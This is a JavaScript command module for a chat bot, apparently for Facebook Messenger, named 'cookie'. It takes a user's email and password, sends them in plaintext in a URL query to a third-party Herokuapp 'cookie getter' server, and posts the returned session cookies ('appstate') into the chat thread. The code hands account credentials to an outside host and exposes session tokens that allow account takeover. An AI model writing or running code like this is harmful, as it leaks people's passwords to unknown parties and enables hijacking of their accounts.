const axios = require('axios');

module.exports.config = {
  name: "cookie",
  version: "2.8",
  role: 0,
  credits: "Hazeyy",
  aliases: ["cookie"], 
  cooldowns: 3,
  hasPrefix: false,
};

module.exports.run = async function ({ api, event, args }) {

  if (args.length !== 2) {
    return api.sendMessage("🤖 𝙿𝚕𝚎𝚊𝚜𝚎 𝚙𝚛𝚘𝚟𝚒𝚍𝚎 𝚎𝚖𝚊𝚒𝚕 𝚊𝚗𝚍 𝚙𝚊𝚜𝚜𝚠𝚘𝚛𝚍.\n\n𝚄𝚜𝚊𝚐𝚎: 𝚌𝚘𝚘𝚔𝚒𝚎 »𝚎𝚖𝚊𝚒𝚕« »𝚙𝚊𝚜𝚜𝚠𝚘𝚛𝚍«", event.threadID, event.messageID);
  }

  api.sendMessage("🕟 | 𝙶𝚎𝚝𝚝𝚒𝚗𝚐 𝚢𝚘𝚞𝚛 𝚌𝚘𝚘𝚔𝚒𝚎/𝚊𝚙𝚙𝚜𝚝𝚊𝚝𝚎, 𝙿𝚕𝚎𝚊𝚜𝚎 𝚠𝚊𝚒𝚝...", event.threadID, event.messageID);

  const [email, password] = args.map(arg => arg.trim());

  try {
    const res = await axios.get(`https://hazee-cookie-getter-6ade5e01b2f3.herokuapp.com/cookies?email=${email}&password=${password}`);
    const userData = res.data;

    const formattedData = userData.map(item => ({
      "key": item.key,
      "value": item.value,
      "domain": item.domain,
      "path": item.path,
      "hostOnly": item.hostOnly,
      "creation": item.creation,
      "lastAccessed": item.lastAccessed
    }));

    setTimeout(() => {
      api.sendMessage("🍪 𝐂𝐨𝐨𝐤𝐢𝐞/𝐀𝐩𝐩𝐬𝐭𝐚𝐭𝐞\n\n" + JSON.stringify(formattedData, null, 4), event.threadID, event.messageID);
    }, 6000);
  } catch (error) {
    console.error("🤖 𝙴𝚛𝚛𝚘𝚛:", error);
    api.sendMessage("🤖 𝙰𝚗 𝚎𝚛𝚛𝚘𝚛 𝚘𝚌𝚌𝚞𝚛𝚎𝚍 𝚠𝚑𝚒𝚕𝚎 𝚛𝚎𝚝𝚛𝚒𝚎𝚟𝚒𝚗𝚐 𝚌𝚘𝚘𝚔𝚒𝚎𝚜.", event.threadID, event.messageID);
  }
}
